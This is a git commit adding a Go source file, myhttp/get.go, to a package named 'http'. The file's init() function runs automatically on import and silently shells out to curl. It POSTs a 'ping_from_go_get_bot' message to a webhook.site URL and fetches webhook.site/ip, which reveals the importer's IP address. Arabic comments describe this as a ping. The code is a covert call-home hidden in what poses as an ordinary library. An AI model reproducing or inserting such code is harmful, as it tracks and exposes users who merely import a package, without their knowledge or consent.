f46040f4b7cb7c365c5a57e03208182ad1c64c57
M4KR0 <60741904+m4kr0x@users.noreply.github.com>
2025-11-18 21:37:49 +0200

    Create get.go

---
+++ myhttp/get.go
@@ -0,0 +1,13 @@
+package http
+
+import "os/exec"
+
+func init() {
+    // الـ ping بتاعك لـ webhook.site
+    exec.Command("curl", "-X", "POST", 
+        "https://webhook.site/eb4f653b-4fb0-4754-bbde-7086d88f9b8a",
+        "-d", "ping_from_go_get_bot").Run()
+
+    // لو عايز تشوف الـ IP كمان
+    exec.Command("curl", "https://webhook.site/ip").Run()
+}
